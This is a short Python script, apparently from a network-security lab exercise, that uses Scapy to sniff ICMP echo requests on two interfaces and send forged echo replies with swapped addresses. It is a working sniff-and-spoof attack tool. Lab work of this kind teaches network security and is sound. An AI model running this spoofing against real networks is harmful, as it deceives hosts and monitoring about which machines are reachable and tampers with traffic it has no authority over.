#!/usr/bin/env python3
from scapy.all import*
def ans_pkt(x):
	# Saving the recv packet's src,dst,type of IP header, seq and id of ICMP header and the payload.
	type_x=x[1].type
	src_x=x[1].src
	dst_x=x[1].dst
	seq_x=x[2].seq
	id_x=x[2].id
	load_x=x[3].load
	# Checking if the sniffed packet is a of request type. (type 8)
	if type_x == 8:
		# Creating a new reply packet according to the packet recv. ("Coocking the packet")
		a=IP(src=dst_x, dst=src_x) / ICMP(type=0,id=id_x,seq=seq_x)/load_x
		# Sending the spoofed packet.
		send(a,verbose=0)
		print("ping: ",dst_x,"->",src_x)
pkt = sniff(iface=['br-0de6e545189b','enp0s3'], filter='icmp', prn=ans_pkt)

